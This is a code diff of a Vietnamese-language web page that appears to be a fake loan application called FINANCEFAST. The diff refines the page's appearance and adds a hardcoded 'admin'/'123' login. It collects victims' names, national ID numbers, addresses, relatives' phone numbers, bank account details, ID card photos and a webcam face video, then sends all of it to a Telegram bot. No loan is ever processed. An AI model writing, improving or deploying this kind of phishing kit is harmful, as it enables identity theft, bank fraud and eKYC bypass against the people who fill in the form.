-                document.getElementById('tabLoginBtn').className = "flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm";
-                document.getElementById('tabRegBtn').className = "flex-1 pb-2 font-semibold text-gray-400 text-sm";
+                document.getElementById('tabLoginBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg bg-amber-500 text-slate-900 shadow-sm transition";
+                document.getElementById('tabRegBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg text-slate-400 transition";
             } else {
                 document.getElementById('registerBox').classList.remove('hidden');
                 document.getElementById('loginBox').classList.add('hidden');
-                document.getElementById('tabRegBtn').className = "flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm";
-                document.getElementById('tabLoginBtn').className = "flex-1 pb-2 font-semibold text-gray-400 text-sm";
+                document.getElementById('tabRegBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg bg-emerald-600 text-white shadow-sm transition";
+                document.getElementById('tabLoginBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg text-slate-400 transition";
             }
         }
 
         function handleRegister() {
             const name = document.getElementById('regName').value;
             const phone = document.getElementById('regPhone').value;
-            if(!name || !phone) { alert("Vui lòng điền đầy đủ thông tin!"); return; }
+            if(!name || !phone) { alert("Vui lòng điền đầy đủ thông tin đăng ký!"); return; }
             alert("Đăng ký thành công! Vui lòng đăng nhập.");
             switchAuthTab('login');
         }
 
         function handleLogin() {
-            const phone = document.getElementById('loginPhone').value;
-            if(!phone) { alert("Vui lòng nhập số điện thoại!"); return; }
-            document.getElementById('stepAuth').classList.add('hidden');
-            document.getElementById('stepHome').classList.remove('hidden');
+            const user = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+
+            if(!user || !pass) { alert("Vui lòng nhập tài khoản và mật khẩu!"); return; }
+
+            // KIỂM TRA TÀI KHOẢN ADMIN MẶC ĐỊNH
+            if(user === "admin" && pass === "123") {
+                closeAuthModal();
+                document.getElementById('stepHome').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
+                return;
+            }
+
+            // Đăng nhập khách hàng bình thường
+            closeAuthModal();
+            alert("Đăng nhập thành công!");
         }
 
-        function goToStep(step) {
-            formData.amount = document.getElementById('loanAmount').value;
-            formData.term = document.getElementById('loanTerm').value;
+        function startLoanProcess() {
+            formData.amount = document.getElementById('amountDisplay').textContent;
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
+            updateProgress(1, 'Bước 1/4: Thông tin cá nhân', 25);
+        }
+
+        function updateProgress(step, title, percent) {
+            document.getElementById('progressContainer').classList.remove('hidden');
+            document.getElementById('stepTitle').textContent = title;
+            document.getElementById('stepPercent').textContent = percent + '%';
+            document.getElementById('progressBar').style.width = percent + '%';
         }
 
         function nextStep(current) {
@@ -202,9 +355,10 @@
                 formData.dob = document.getElementById('pDob').value;
                 formData.address = document.getElementById('pAddress').value;
                 formData.cccd = document.getElementById('pCccd').value;
-                if(!formData.name || !formData.dob || !formData.cccd) { alert("Vui lòng điền đủ thông tin!"); return; }
+                if(!formData.name || !formData.dob || !formData.cccd) { alert("Vui lòng điền đủ thông tin cá nhân!"); return; }
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
+                updateProgress(2, 'Bước 2/4: Người thân tham chiếu', 50);
             } else if(current === 2) {
                 formData.rName = document.getElementById('rName1').value;
                 formData.rPhone = document.getElementById('rPhone1').value;
@@ -212,13 +366,15 @@
                 if(!formData.rName || !formData.rPhone) { alert("Vui lòng điền thông tin người thân!"); return; }
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
+                updateProgress(3, 'Bước 3/4: Tài khoản nhận giải ngân', 75);
             } else if(current === 3) {
                 formData.bankName = document.getElementById('bankName').value;
                 formData.bankAccount = document.getElementById('bankAccount').value;
                 formData.bankOwner = document.getElementById('bankOwner').value;
-                if(!formData.bankAccount || !formData.bankName) { alert("Vui lòng điền thông tin tài khoản!"); return; }
+                if(!formData.bankAccount || !formData.bankName) { alert("Vui lòng điền thông tin ngân hàng!"); return; }
                 document.getElementById('step3').classList.add('hidden');
                 document.getElementById('step4').classList.remove('hidden');
+                updateProgress(4, 'Bước 4/4: Xác thực eKYC', 100);
             }
         }
 
@@ -227,31 +383,31 @@
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 document.getElementById('webcam').srcObject = mediaStream;
                 document.getElementById('recBtn').classList.remove('hidden');
-                document.getElementById('camStatus').textContent = "Camera sẵn sàng. Bấm Quay!";
-            } catch(e) { alert("Không bật được camera!"); }
+                document.getElementById('camStatus').textContent = "Trạng thái: Đã sẵn sàng quay video";
+            } catch(e) { alert("Không thể truy cập camera. Vui lòng cấp quyền trình duyệt!"); }
         }
 
         function recordVideo() {
             recordedChunks = [];
             mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
             mediaRecorder.ondataavailable = e => { if(e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = () => { videoBlob = new Blob(recordedChunks, { type: 'video/webm' }); document.getElementById('camStatus').textContent = "✅ Đã quay video xong!"; };
+            mediaRecorder.onstop = () => { videoBlob = new Blob(recordedChunks, { type: 'video/webm' }); document.getElementById('camStatus').textContent = "✅ Đã quay video xác thực thành công!"; };
             mediaRecorder.start();
-            document.getElementById('camStatus').textContent = "🔴 Đang quay khuôn mặt...";
+            document.getElementById('camStatus').textContent = "🔴 Đang quay... Hãy nhìn thẳng vào camera!";
             setTimeout(() => { mediaRecorder.stop(); }, 3500);
         }
 
         async function submitFinalData() {
-            if(!videoBlob) { alert("Vui lòng quay video khuôn mặt trước khi gửi!"); return; }
+            if(!videoBlob) { alert("Vui lòng quay video khuôn mặt eKYC trước khi gửi hồ sơ!"); return; }
             const btn = document.getElementById('finalBtn');
             btn.disabled = true;
-            btn.textContent = "Đang gửi dữ liệu bảo mật...";
+            btn.textContent = "Đang mã hóa và gửi hồ sơ...";
 
             const frontImg = document.getElementById('imgFront').files[0];
             const backImg = document.getElementById('imgBack').files[0];
 
             try {
-                const msg = `🚨 HỒ SƠ VAY MỚI (4 BƯỚC)!\n\n💰 Gói vay: ${formData.amount} (${formData.term})\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Quê quán: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
+                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n💰 Số tiền vay: ${formData.amount}\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -271,10 +427,14 @@
                 const fd3 = new FormData(); fd3.append('chat_id', CHAT_ID); fd3.append('video', videoBlob, 'face.webm'); fd3.append('caption', `Video eKYC - ${formData.name} (${formData.cccd})`);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd3 });
 
-                alert("Gửi hồ sơ thành công! Hệ thống đang chờ xét duyệt.");
-                location.reload();
+                // CHUYỂN SANG MÀN HÌNH TIẾN TRÌNH GIẢI NGÂN
+                document.getElementById('step4').classList.add('hidden');
+                document.getElementById('progressContainer').classList.add('hidden');
+                document.getElementById('succAmount').textContent = formData.amount;
+                document.getElementById('stepSuccess').classList.remove('hidden');
+
             } catch(err) {
-                alert("Lỗi kết nối. Vui lòng thử lại!");
+                alert("Lỗi kết nối đường truyền. Vui lòng thử lại!");
                 btn.disabled = false;
                 btn.textContent = "Gửi Hồ Sơ Xét Duyệt";
             }
